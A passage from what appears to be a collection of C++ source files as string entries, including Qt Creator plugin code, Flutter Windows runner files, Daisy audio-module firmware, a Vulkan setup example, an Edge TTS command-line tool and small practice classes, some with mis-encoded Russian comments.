Core::Context(\n                                                                 Core::Constants::C_GLOBAL));\n    cmd->setDefaultKeySequence(QKeySequence(Tr::tr(\"Ctrl+Alt+Meta+A\")));\n    connect(action, &QAction::triggered, this, &MyplugintestPlugin::triggerAction);\n\n    Core::ActionContainer *menu = Core::ActionManager::createMenu(Constants::MENU_ID);\n    menu->menu()->setTitle(Tr::tr(\"Myplugintest\"));\n    menu->addAction(cmd);\n    Core::ActionManager::actionContainer(Core::Constants::M_TOOLS)->addMenu(menu);\n}\n\nvoid MyplugintestPlugin::extensionsInitialized()\n{\n    // Retrieve objects from the plugin manager's object pool\n    // In the extensionsInitialized function, a plugin can be sure that all\n    // plugins that depend on it are completely initialized.\n}\n\nExtensionSystem::IPlugin::ShutdownFlag MyplugintestPlugin::aboutToShutdown()\n{\n    // Save settings\n    // Disconnect from signals that are not needed during shutdown\n    // Hide UI (if you add UI that is not in the main window directly)\n    return SynchronousShutdown;\n}\n\nvoid MyplugintestPlugin::triggerAction()\n{\n    QMessageBox::information(Core::ICore::mainWindow(),\n                             Tr::tr(\"Action Triggered\"),\n                             Tr::tr(\"This is an action from Myplugintest.\"));\n}\n\n} // namespace Myplugintest::Internal\n\n#include <myplugintest.moc>\n",
    "#include \"win32_window.h\"\n\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n    FreeLibrary(user32_module);\n  }\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::CreateAndShow(const std::wstring& title,\n                                const Point& origin,\n                                const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW | WS_VISIBLE,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  return OnCreate();\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    SetWindowLongPtr(window, GWLP_USERDATA,\n                     reinterpret_cast<LONG_PTR>(window_struct->lpCreateParams));\n\n    auto that = static_cast<Win32Window*>(window_struct->lpCreateParams);\n    EnableFullDpiSupportIfAvailable(window);\n    that->window_handle_ = window;\n  } else if (Win32Window* that = GetThisFromHandle(window)) {\n    return that->MessageHandler(window, message, wparam, lparam);\n  }\n\n  return DefWindowProc(window, message, wparam, lparam);\n}\n\nLRESULT\nWin32Window::MessageHandler(HWND hwnd,\n                            UINT const message,\n                            WPARAM const wparam,\n                            LPARAM const lparam) noexcept {\n  switch (message) {\n    case WM_DESTROY:\n      window_handle_ = nullptr;\n      Destroy();\n      if (quit_on_close_) {\n        PostQuitMessage(0);\n  ",
    "#include \"daisy_patch_sm.h\"\n#include \"daisysp.h\"\n#include \"dsp.h\"\n#include \"time_machine_hardware.h\"\n\nusing namespace daisy;\nusing namespace oam;\nusing namespace time_machine;\nusing namespace std;\n\n#define TIME_SECONDS 150\n#define BUFFER_WIGGLE_ROOM_SAMPLES 1000\n\n#define LINEAR_TIME false\n\n//Setting Struct containing parameters we want to save to flash\nstruct CalibrationData {\n\tfloat timeCvOffset = 0.0;\n\tfloat skewCvOffset = 0.0;\n\tfloat feedbackCvOffset = 0.0;\n\tint calibrated = false;\n\n\t//Overloading the != operator\n\t//This is necessary as this operator is used in the PersistentStorage source code\n\tbool operator!=(const CalibrationData& a) const {\n        return !(\n\t\t\t\ta.timeCvOffset==skewCvOffset && \\\n\t\t\t\ta.skewCvOffset==skewCvOffset && \\\n\t\t\t\ta.feedbackCvOffset==feedbackCvOffset && \\\n\t\t\t\ta.calibrated==calibrated\n\t\t\t);\n    }\n};\n\n// init buffers - add an extra second just in case we somehow end up slightly beyond max time\n// due to precision loss in floating point arithmetic (maybe use doubles for time values???)\nfloat DSY_SDRAM_BSS bufferLeft[48000 * TIME_SECONDS + BUFFER_WIGGLE_ROOM_SAMPLES];\nfloat DSY_SDRAM_BSS bufferRight[48000 * TIME_SECONDS + BUFFER_WIGGLE_ROOM_SAMPLES];\n\nTimeMachineHardware hw;\nPersistentStorage<CalibrationData> CalibrationDataStorage(hw.qspi);\nGateIn gate;\nLed leds[9];\n\nStereoTimeMachine timeMachine;\nClockRateDetector clockRateDetector;\nContSchmidt timeKnobSchmidt;\nContSchmidt timeCvSchmidt;\n\nSlew timeKnobSlew;\nSlew feedbackKnobSlew;\nSlew distributionKnobSlew;\nSlew timeCvSlew;\nSlew feedbackCvSlew;\nSlew distributionCvSlew;\n\n// global storage for CV/knobs so we don't get them twice to print diagnostics\nfloat timeCv = 0.0;\nfloat feedbackCv = 0.0;\nfloat skewCv = 0.0;\nfloat timeKnob = 0.0;\nfloat feedbackKnob = 0.0;\nfloat skewKnob = 0.0;\nfloat drySlider = 0.0;\nfloat delaySliders = 0.0;\n\n// calibration offsets for CV\nfloat timeCvOffset = 0.0;\nfloat feedbackCvOffset = 0.0;\nfloat skewCvOffset = 0.0;\n\nfloat finalTimeValue = 0.0;\nfloat finalDistributionValue = 0.0;\nfloat finalFeedbackValue = 0.0;\n\n// delay setting LEDs for startup sequences\nbool setLeds = false;\n\nCpuLoadMeter cpuMeter;\n\nint droppedFrames = 0;\n\n// called every N samples (search for SetAudioBlockSize)\nvoid AudioCallback(AudioHandle::InputBuffer in, AudioHandle::OutputBuffer out, size_t size)\n{\n\t// cpu meter measurements start\n\tcpuMeter.OnBlockStart();\n\tdroppedFrames++;\n\n\t// process controls\n\thw.ProcessAllControls();\n\n\t// populate/update global CV/knob vars (time is slewed to reduce noise at large time values)\n\ttimeKnob = minMaxKnob(1.0 - hw.GetAdcValue(TIME_KNOB), 0.0008);\n\tfeedbackKnob = fourPointWarp(1.0 - minMaxKnob(hw.GetAdcValue(FEEDBACK_KNOB), 0.028));\n\tskewKnob = fourPointWarp(1.0 - minMaxKnob(hw.GetAdcValue(SKEW_KNOB), 0.0008));\n\n\ttimeCv = clamp(hw.GetAdcValue(TIME_CV) - timeCvOffset, -1, 1);\n\tfeedbackCv = clamp(hw.GetAdcValue(FEEDBACK_CV) - feedbackCvOffset, -1, 1);\n\tskewCv = clamp(hw.GetAdcValue(SKEW_CV) - skewCvOffset, -1, 1);\n\n\tdrySlider = minMaxSlider(1.0 - hw.GetAdcValue(DRY_SLIDER));\n\n\t// calculate time based on clock if present, otherwise simple time\n\tfloat time = 0.0; \n\tif(clockRateDetector.GetInterval() > 0.0) {\n\t\t// 12 quantized steps for knob, 10 for CV (idk what these quanta should actually be)\n\t\t// time doubles and halves with each step, they are additive/subtractive\n\t\tfloat timeCoef = pow(2.0, (timeKnobSchmidt.Process((1.0-timeKnob)*12)) + (timeCvSchmidt.Process(timeCv*10))) / pow(2.0, 6.0);\n\t\ttime = clockRateDetector.GetInterval() / timeCoef;\n\t\t// make sure time is a power of two less than the max time available in the buffer\n\t\twhile(time > TIME_SECONDS) time *= 0.5;\n\t} else {\n\t\t// time linear with knob, scaled v/oct style with CV\n\t\ttime = pow(timeKnobSlew.Process(timeKnob), 2.0) * 8.0 / pow(2.0, timeCvSlew.Process(timeCv) * 5.0);\n\t}\n\n\t// force time down to a max value (taking whichever is lesser, the max or the time)\n\ttime = std::min((float)TIME_SECONDS, time);\n\t// condition feedback knob to have deadzone in the middle, add CV\n\tfloat feedback = clamp(fourPointWarp(feedbackKnobSlew.Process(feedbackKnob)) * 2.0 + feedbackCvSlew.Process(feedbackCv), 0, 3);\n\t// condition distribution knob value to have deadzone in the middle, add CV\n\tfloat distribution = fourPointWarp(distributionKnobSlew.Process(skewKnob)) + distributionCvSlew.Process(skewCv);\n\n\tfinalTimeValue = time;\n\tfinalFeedbackValue = feedback;\n\tfinalDistributionValue = distribution;\n\n\tfor(int i=0; i<9; i++) {\n\t\tif(i<8) {\n\t\t\t// set LEDs based on loudness for last 8 sliders\n\t\t\tfloat loudness = timeMachine.timeMachineLeft.readHeads[i].loudness.Get();\n\t\t\tloudness = max(loudness, timeMachine.timeMachineRight.readHeads[i].loudness.Get());\n\t\t\tif(setLeds) {\n\t\t\t\tleds[i+1].Set(loudness);\n\t\t\t\tleds[i+1].Update();\n\t\t\t}\n\t\t} else {\n\t\t\t// set LEDs based on loudness for first slider\n\t\t\tfloat loudness = timeMachine.timeMachineLeft.loudness.Get();\n\t\t\tloudness = max(loudness, timeMachine.timeMachineRight.loudness.Get());\n\t\t\tif(setLeds) {\n\t\t\t\tleds[0].Set(loudness);\n\t\t\t\tled",
    "#define GLFW_INCLUDE_VULKAN\n#include <GLFW/glfw3.h>\n#include <algorithm>\n#include <cstdlib>\n#include <iostream>\n#include <limits>\n#include <optional>\n#include <set>\n#include <sstream>\n#include <stdexcept>\n#include <vector>\n\nconst uint32_t WIDTH = 800;\nconst uint32_t HEIGHT = 600;\n\nconst std::vector<const char *> validationLayers = {\n    \"VK_LAYER_KHRONOS_validation\"\n};\n\nconst std::vector<const char *> deviceExtensions = {\n    VK_KHR_SWAPCHAIN_EXTENSION_NAME\n};\n\nVKAPI_ATTR VkBool32 VKAPI_CALL\ndebugCallback(VkDebugUtilsMessageSeverityFlagBitsEXT messageSeverity,\n              VkDebugUtilsMessageTypeFlagsEXT messageType,\n              VkDebugUtilsMessengerCallbackDataEXT const *pCallbackData,\n              void * /*pUserData*/) {\n    std::ostringstream message;\n    std::string prefix;\n    std::string suffix;\n\n    message << \"validation layer: \";\n\n    switch (messageType) {\n    case VK_DEBUG_UTILS_MESSAGE_TYPE_VALIDATION_BIT_EXT:\n        message << \"validation: \";\n        break;\n    case VK_DEBUG_UTILS_MESSAGE_TYPE_GENERAL_BIT_EXT:\n        message << \"general: \";\n        break;\n    case VK_DEBUG_UTILS_MESSAGE_TYPE_PERFORMANCE_BIT_EXT:\n        message << \"performance: \";\n        break;\n\n    default:\n        break;\n    }\n\n    message << pCallbackData->pMessage;\n\n#ifdef __linux__\n    switch (messageSeverity) {\n    case VK_DEBUG_UTILS_MESSAGE_SEVERITY_WARNING_BIT_EXT:\n        prefix = \"\\x1B[33m\";\n        suffix = \"\\x1B[0m\";\n        break;\n    case VK_DEBUG_UTILS_MESSAGE_SEVERITY_ERROR_BIT_EXT:\n        prefix = \"\\x1B[31m\";\n        suffix = \"\\x1B[0m\";\n        break;\n\n    default:\n        break;\n    }\n#endif //__linux__\n\n    std::cout << prefix << message.str() << suffix << std::endl;\n\n    return VK_FALSE;\n}\n\nVkResult CreateDebugUtilsMessengerEXT(\n    VkInstance instance, const VkDebugUtilsMessengerCreateInfoEXT *pCreateInfo,\n    const VkAllocationCallbacks *pAllocator,\n    VkDebugUtilsMessengerEXT *pDebugMessenger) {\n    auto func = reinterpret_cast<PFN_vkCreateDebugUtilsMessengerEXT>(\n        vkGetInstanceProcAddr(instance, \"vkCreateDebugUtilsMessengerEXT\"));\n    if (func != nullptr) {\n        return func(instance, pCreateInfo, pAllocator, pDebugMessenger);\n    } else {\n        return VK_ERROR_EXTENSION_NOT_PRESENT;\n    }\n}\n\nvoid DestroyDebugUtilsMessengerEXT(VkInstance instance,\n                                   VkDebugUtilsMessengerEXT debugMessenger,\n                                   const VkAllocationCallbacks *pAllocator) {\n    auto func = reinterpret_cast<PFN_vkDestroyDebugUtilsMessengerEXT>(\n        vkGetInstanceProcAddr(instance, \"vkDestroyDebugUtilsMessengerEXT\"));\n    if (func != nullptr) {\n        return func(instance, debugMessenger, pAllocator);\n    }\n}\n\nvoid listRequiredInstanceExtensions(\n    const std::vector<const char *> &extensions) {\n    std::cout << \"required extensions:\\n\";\n\n    for (const auto extension : extensions) {\n        std::cout << '\\t' << extension << std::endl;\n    }\n}\n\nclass HelloTriangleApplication {\n    struct QueueFamilyIndices {\n        std::optional<uint32_t> graphicsFamily;\n        std::optional<uint32_t> presentFamily;\n\n        [[nodiscard]] bool isComplete() const {\n            return graphicsFamily.has_value() && presentFamily.has_value();\n        }\n    };\n\n    struct SwapChainSupportDetails {\n        VkSurfaceCapabilitiesKHR capabilities{};\n        std::vector<VkSurfaceFormatKHR> formats;\n        std::vector<VkPresentModeKHR> presentModes;\n    };\n\nprivate:\n    GLFWwindow *window_ = nullptr;\n    VkInstance instance_ = VK_NULL_HANDLE;\n    VkDebugUtilsMessengerEXT debugMessenger_ = VK_NULL_HANDLE;\n    VkPhysicalDevice physicalDevice_ = VK_NULL_HANDLE;\n    VkDevice device_ = VK_NULL_HANDLE;\n    VkSurfaceKHR surface_ = VK_NULL_HANDLE;\n    VkQueue graphicsQueue_ = VK_NULL_HANDLE;\n    VkQueue presentQueue_ = VK_NULL_HANDLE;\n    VkSwapchainKHR swapChain_ = VK_NULL_HANDLE;\n    std::vector<VkImage> swapChainImages_;\n    // VkFormat swapChainImageFormat_;\n    // VkExtent2D swapChainExtent_;\n\npublic:\n    void run() {\n        initWindow();\n        initVulkan();\n        mainLoop();\n        cleanup();\n    }\n\nprivate:\n    void initWindow() {\n        if (!glfwInit())\n            throw std::runtime_error(\"Failed to initialize GLFW!\");\n\n        glfwWindowHint(GLFW_CLIENT_API, GLFW_NO_API);\n        glfwWindowHint(GLFW_RESIZABLE, GLFW_FALSE);\n\n        if ((window_ =\n                 glfwCreateWindow(WIDTH, HEIGHT, \"Vulkan\", nullptr, nullptr))\n            == nullptr)\n            throw std::runtime_error(\"Failed to create GLFW window!\");\n    }\n\n    void initVulkan() {\n        createInstance();\n#ifndef NDEBUG\n        setupDebugMessenger();\n#endif\n        createSurface();\n        pickPhysicalDevice();\n        createLogicalDevice();\n        createSwapChain();\n    }\n\n    void mainLoop() {\n        while (!glfwWindowShouldClose(window_)) {\n            glfwPollEvents();\n        }\n    }\n\n    void cleanup() {\n        vkDestroySwapchainKHR(device_, swapChain_, nullptr);\n#ifndef NDEBUG\n        DestroyDeb",
    "#include <iostream>\n#include <vector>\n#include <stdexcept>\n#define interface struct\nusing namespace std;\n\ninterface DBAPI\n{\n    virtual string getDBName() = 0;\n};\n\nclass DatabaseAPI : public DBAPI\n{\npublic:\n    string getDBName()\n    {\n        return name;\n    }\nprivate:\n    string name = \"REAL_DB\";\n};\n\nclass LogSystem\n{\npublic:\n    LogSystem(DBAPI* db) : DB{ db }\n    {\n\n    }\n\n    string getLogMessage(string content)\n    {\n        string msg = \"\";\n        msg += string(\"[\") + DB->getDBName() + string(\"]\");\n        msg += content + string(\"\\n\");\n        return msg;\n    }\nprivate:\n    DBAPI *DB;\n};\n\n\n\nclass Cal\n{\npublic:\n    int getValue(void)\n    {\n        return 0;\n    }\n    int getSum(int a, int b)\n    {\n        return a + b;\n    }\n    vector<int> getResult(const vector<int>& input)\n    {\n        vector<int> output;\n        for (int i = 0; i < input.size(); i++)\n        {\n            int num = input[i];\n            if (num >= 10 || num == 4)\n            {\n                throw invalid_argument(\"INV\");\n            }\n\n            num++;\n            if (num == 4) num++;\n            if (num == 10) num = 0;\n\n            output.push_back(num);\n        }\n\n        return output;\n    }\n};\n",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <tuple>\n#include <chrono>\n#include <boost/program_options.hpp>\n\n#include \"fmt/format.h\"\n#include \"../include/tts.h\"\n\nnamespace po = boost::program_options;\n\nvoid usage(const char * name, po::options_description& opts) {\n    cout << \"usgae: \" << name \n         << \" [-h] [-l] [-t TEXT] [-v VOICE] [--rate RATE] [--volume VOLUME] [--pitch PITCH]\" \n         << \" [-o OUTFILE] [--proxy PROXY]\" << endl << endl << \"Microsoft Edge TTS\" << endl << endl \n         << \"optional arguments:\" << endl << opts << endl;\n}\n\n\nstring mktimestamp(int t) {\n    int hours = (t / 10000000) / 3600;\n    int minutes = ((t / 10000000) % 3600) / 60;\n    int seconds = ((t / 10000000) % 3600) % 60;\n    int millions = (t % 10000000) / 10000;\n\n    return fmt::format(\"{:02d}:{:02d}:{:02d}.{:03d}\", \n                       hours, minutes, seconds, millions);\n}\n\nvoid echo_subtitle(const vector<tuple<int, int, string>>& v, int& start) {\n    cout << mktimestamp(start) << \" --> \";\n\n    int end = get<0>(*(v.end() - 1));\n    cout << mktimestamp(end) << endl;\n    start = end;\n\n    for (auto item: v) {\n        string text;\n        tie(ignore, ignore, text) = item;\n        cout << text << \" \";\n    }\n    cout << endl << endl;\n}\n\nint main(int argc, char * argv[]) {\n    po::options_description opts;\n    opts.add_options()\n        (\"help,h\", \"show this help message and exit\")\n        (\"list-voices,l\", \"lists available voices and exits\")\n        (\"text,t\", po::value<string>()->value_name(\"TEXT\"), \"what TTS will say\")\n        (\"voice,v\", po::value<string>()->value_name(\"VOICE\")->default_value(\"en-US-AriaNeural\"), \"voice for TTS. Default: en-US-AriaNeural\")\n        (\"rate\", po::value<string>()->value_name(\"RATE\")->default_value(\"+0%\"), \"set TTS rate. Default +0%.\")\n        (\"volume\", po::value<string>()->value_name(\"VOLUME\")->default_value(\"+0%\"), \"set TTS volume. Default +0%.\")\n        (\"pitch,r\", po::value<string>()->value_name(\"PITCH\")->default_value(\"+0Hz\"), \"set TTS pitch. Default +0Hz.\")\n        (\"outfile,o\", po::value<string>()->value_name(\"OUTFILE\")->default_value(\"output.mp3\"), \"set TTS output mp3 file. Default output.mp3.\")\n        (\"webvtt,w\", \"show subtitles\")\n        ;\n    try {\n        po::variables_map vm;\n        po::store(po::parse_command_line(argc, argv, opts), vm);\n        po::notify(vm);\n\n        if (vm.count(\"list-voices\") > 0) {\n            vector<tuple<string, string>> voices;\n            if (voices_list(voices) < 0) return -1;\n            for (auto voice: voices) {\n                string name, gender;\n                tie(name, gender) = voice;\n                cout << \"Name: \" << name << \" Gender: \" << gender << endl;\n            }\n            return 0;\n        } else if (vm.count(\"text\") > 0) {\n            string text = vm[\"text\"].as<string>();\n            string outfile = vm[\"outfile\"].as<string>();\n            string rate = vm[\"rate\"].as<string>();\n            string volume = vm[\"volume\"].as<string>();\n            string pitch = vm[\"pitch\"].as<string>();\n            string voice = vm[\"voice\"].as<string>();\n\n            cout << \"voice: \" << voice << \" text: \" << text << endl;\n\n            if (tts_open(rate, pitch, volume) < 0) {\n                cout << \"fail to open the connection.\" << endl;\n                return -1;\n            }\n\n            vector<tuple<int, int, string>> meta;\n            vector<string> data;\n\n            tts_request(voice, text, meta, data);\n\n            ofstream o(outfile);\n            for (string item: data) {\n                o << item;\n            }\n            o.close();\n\n            if (vm.count(\"webvtt\") > 0) {\n                cout << endl << endl;\n\n                cout << \"WEBVTT\" << endl << endl;\n                int words = 10;\n                int lines = meta.size() / words;\n                int start = get<0>(meta[0]);\n                for (int i=0; i<=lines; i++) {\n                    if ((i * words) >= meta.size()) break;\n\n                    vector<tuple<int, int, string>> v;\n                    if (i == lines) {\n                        v.assign(meta.begin() + i * words, meta.end());\n                    } else {\n                        v.assign(meta.begin() + i * words, meta.begin() + (i + 1) * words);\n                    }\n                    echo_subtitle(v, start);\n                }\n\n                cout << endl << endl;\n            }\n\n            tts_close();\n\n            cout << outfile << \" is ok!\" << endl;\n            return 0;\n        } else {\n            usage(argv[0], opts);\n        }\n    } catch (exception e) {\n        cout << \"error: \" << e.what() << endl;\n        usage(argv[0], opts);\n    }\n\n    return 0;\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, utf8_string.data(),\n      target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"food_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// \u00c2\u00e0\u00f8\u00e0 \u00e7\u00e0\u00e4\u00e0\u00f7\u00e0 \u00e4\u00ee\u00e1\u00e0\u00e2\u00e8\u00f2\u00fc \u00ea \u00ef\u00f0\u00ee\u00e3\u00f0\u00e0\u00ec\u00ec\u00e5 \u00ea\u00eb\u00e0\u00f1\u00f1, \u00ea\u00ee\u00f2\u00ee\u00f0\u00fb\u00e9 \u00e1\u00f3\u00e4\u00e5\u00f2 \u00f1\u00ee\u00e4\u00e5\u00f0\u00e6\u00e0\u00f2\u00fc \u00e2 \u00f1\u00e5\u00e1\u00e5 \u00ed\u00e5\u00f1\u00ea\u00ee\u00eb\u00fc\u00ea\u00ee \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00ee\u00e2 \u00ea\u00eb\u00e0\u00f1\u00f1\u00e0 \u00f4\u00e8\u00e3\u00f3\u00f0\u00e0, \u00f1\u00ee\u00e7\u00e4\u00e0\u00e2\u00e0\u00ff \u00f2\u00e5\u00ec \u00f1\u00e0\u00ec\u00fb\u00ec \u00ea\u00ee\u00ec\u00ef\u00ee\u00e7\u00e8\u00f6\u00e8\u00fe.\n\n#include <iostream>\nusing namespace std;\n\n// \u00ea\u00eb\u00e0\u00f1\u00f1 \"\u00f2\u00ee\u00f7\u00ea\u00e0\"\nclass Point {\n\n\t// \u00ea\u00ee\u00ee\u00ee\u00f0\u00e4\u00e8\u00ed\u00e0\u00f2\u00fb\n\tint X;\n\tint Y;\npublic:\n\n\t//\u00ea\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00ea\u00f2\u00ee\u00f0\n\tPoint() {\n\t\tX = Y = 0;\n\t}\n\n\t//\u00f3\u00f1\u00f2\u00e0\u00ed\u00ee\u00e2\u00ea\u00e0 \u00ea\u00ee\u00ee\u00f0\u00e4\u00e8\u00ed\u00e0\u00f2\n\tvoid SetPoint(int iX, int iY) {\n\t\tX = iX;\n\t\tY = iY;\n\t}\n\n\t//\u00e4\u00e5\u00ec\u00ee\u00ed\u00f1\u00f2\u00f0\u00e0\u00f6\u00e8\u00ff \u00ea\u00ee\u00ee\u00f0\u00e4\u00e8\u00ed\u00e0\u00f2\n\tvoid Show() {\n\t\tcout << \"----------------------------\\n\\n\";\n\t\tcout << X << \"\\t\" << Y << \"\\n\\n\";\n\t\tcout << \"----------------------------\\n\\n\";\n\t}\n};\n//\u00ea\u00eb\u00e0\u00f1\u00f1 \u00f4\u00e8\u00e3\u00f3\u00f0\u00e0\nclass Figura {\n\n\t// \u00e0\u00e3\u00f0\u00e5\u00e3\u00e0\u00f6\u00e8\u00ff \u00f2\u00ee\u00f7\u00ea\u00e8\n\t// (\u00ea\u00ee\u00ee\u00f0\u00e4\u00e8\u00ed\u00e0\u00f2\u00fb \u00f3\u00e3\u00eb\u00ee\u00e2)\n\tPoint* obj;\n\n\t// \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00f3\u00e3\u00eb\u00ee\u00e2\n\tint count;\n\t// \u00f6\u00e2\u00e5\u00f2 \u00f4\u00e8\u00e3\u00f3\u00f0\u00fb\n\tint color;\n\npublic:\n\n\t//\u00ea\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00ea\u00f2\u00ee\u00f0\n\tFigura() {\n\t\tcount = color = 0;\n\t\tobj = NULL;\n\t}\n\n\t// \u00f1\u00ee\u00e7\u00e4\u00e0\u00ed\u00e8\u00e5 \u00f4\u00e8\u00e3\u00f3\u00f0\u00fb\n\tvoid CreateFigura(int cr, int ct) {\n\t\t// \u00e5\u00f1\u00eb\u00e8 \u00f3\u00e3\u00eb\u00ee\u00e2 \u00ec\u00e5\u00ed\u00fc\u00f8\u00e5 \u00f2\u00f0\u00e5\u00f5 - \u00fd\u00f2\u00ee \u00ed\u00e5 \u00f4\u00e8\u00e3\u00f3\u00f0\u00e0\n\t\tif (ct < 3) exit(0);\n\t\t//\u00e8\u00ed\u00e8\u00f6\u00e8\u00e0\u00eb\u00e8\u00e7\u00e0\u00f6\u00e8\u00ff \u00f6\u00e2\u00e5\u00f2\u00e0 \u00e8 \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00e0 \u00f3\u00e3\u00eb\u00ee\u00e2\n\t\tcount = ct;\n\t\tcolor = cr;\n\t\t// 